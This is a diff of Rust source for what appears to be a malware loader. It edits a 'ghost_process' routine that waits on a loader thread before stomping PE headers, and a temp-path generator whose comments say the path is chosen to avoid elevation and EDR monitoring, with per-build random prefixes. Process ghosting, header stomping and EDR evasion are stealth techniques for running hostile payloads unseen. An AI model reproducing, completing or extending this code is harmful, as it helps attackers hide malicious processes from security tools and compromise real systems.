@@ -453,7 +453,10 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
         return None;
     }
 
-    let mut timeout: i64 = -300000000; 
+    // Wait for the loader to finish before stomping PE headers
+    // STATUS_TIMEOUT (0x102) = still alive, safe to stomp.
+    // STATUS_WAIT_0 (0x0)   = thread exited, process is dead skip stomp.
+    let mut timeout: i64 = -300000000; // 3s in 100ns units (negative = relative)
     debug!("[GHOST] Waiting for loader to finish (3s timeout)....");
     let wait_result = nt::nt_wait_for_single_object(
         state.thread_handle, 
@@ -473,8 +476,14 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     Some(state)  
 }
 
+/**
+ * Per user temp directory instead of C:\Windows\Temp: \??\C:\Windows\Temp -> requires elevation and it's monitored by EDRs
+ * Instead \??\C:\Users\<user>\AppData\Local\Temp would be ideal but we dont know the use name, use C:\Windows\Temp with randomized prefix
+ * Each build selects a random prefix based on RDTSC
+ * */
 unsafe fn generate_temp_path() -> [u16; 48] {
     let mut path: [u16; 48] = [0u16; 48];
+
 
     let prefixes: [[u16; 3]; 6] = [
         [0x0074, 0x006D, 0x0070],  // tmp
@@ -485,6 +494,7 @@ unsafe fn generate_temp_path() -> [u16; 48] {
         [0x0073, 0x0063, 0x0070],  // scp
     ];
 
+    // prefix of \??\C:\Windows\Temp\
     let base_prefix: &[u16] = &[
         0x005C, 0x003F, 0x003F, 0x005C,                                 // \??\
         0x0043, 0x003A, 0x005C,                                         // C:\
